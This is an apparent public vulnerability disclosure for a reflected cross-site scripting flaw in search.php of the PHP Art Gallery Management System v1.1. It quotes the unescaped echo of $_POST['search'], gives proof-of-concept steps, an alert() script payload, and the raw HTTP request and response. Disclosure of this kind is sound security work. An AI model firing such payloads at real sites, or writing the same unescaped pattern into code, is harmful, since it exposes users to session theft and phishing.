---
title: Art Gallery Management System Project v1.1 - Reflected Cross-Site Scripting (XSS)
published: true
---

- **Exploit Title:** Art Gallery Management System Project v1.1 - Reflected Cross-Site Scripting (XSS)
- **Application:**  Art Gallery Management System
- **Google Dork:** N/A
- **Date:** 16.03.2024
- **Bugs:** Reflected XSS
- **Exploit Author:** SoSPiro
- **Vendor Homepage:** https://phpgurukul.com/
- **Software Link:** https://phpgurukul.com/art-gallery-management-system-using-php-and-mysql/
- **Version:** 1.1
- **Tested on:** Windows 10 64 bit Wampserver 

----



### Vulnerability Details

- **Application Name:** Art Gallery Management System 
- **Vendor Homepage:** [Vendor Homepage](https://phpgurukul.com/)
- **Software Link:** [Vendor Homepage](https://phpgurukul.com/art-gallery-management-system-using-php-and-mysql/)
- The vulnerability lies in the following code snippet:

`Art-Gallery-MS-PHP/agms/search.php`

```php
<?php
...

<h3 class="title text-center mb-lg-5">
    <h2 class="head" align="center">
        Search Result Againt keyword 
        <span style="color:red">"<?php echo $_POST['search'];?>"</span>
    </h2>
    <hr />
...

?>
```
This code has an XSS (Cross-Site Scripting) vulnerability. The **$_POST['search']** parameter, which is user input, is directly embedded into HTML, allowing potentially malicious JavaScript code to execute on the page.

### Vulnerability Description:

A security vulnerability has been identified within the `search.php` file of this application. 
It has been observed that the input provided by users when searching **($_POST['search'])** is not properly sanitized. 
While the user-supplied data within the input field is directly embedded into HTML content,
necessary filtering and escaping processes have not been applied.





### Proof of Concept:

1. Install The application Art Gallery Management System Project v1.1
2. Go to `http://localhost/Art-Gallery-MS-PHP/agms/search.php`
3. Now Insert XSS Payload in **`Search Here..`** input.
4. XSS has been triggered.

- the XSS Payload: `<script>alert(1111)</script>`
 
[ -> PoC ViDeO <- ](https://drive.google.com/file/d/1fHWWIss9EvYAQj2QBzkpBLQVBgZ6vTXj/view)

#### **Request**
```
POST /Art-Gallery-MS-PHP/agms/search.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: _ga=GA1.1.2080672900.1708952048
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-PwnFox-Color: cyan
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

search=<script>alert(1111)</script>
```

#### **Response**
```
...

<h2 class="head" align="center">
               Search Result Againt keyword <span style="color:red">"<script>alert(1111)</script>

"</span></h2>

...
```

### Impact

This security vulnerability allows attackers to steal sessioninformation through
XSS attacks on the web application, deceive users by directing them to malicious actions,
or modify page content. This can lead to the exposure of personal information, phishing attacks,
and overall compromise of the application's security. Therefore, immediate intervention to address
the security vulnerability in the application and implementation of necessary fixes are crucial.
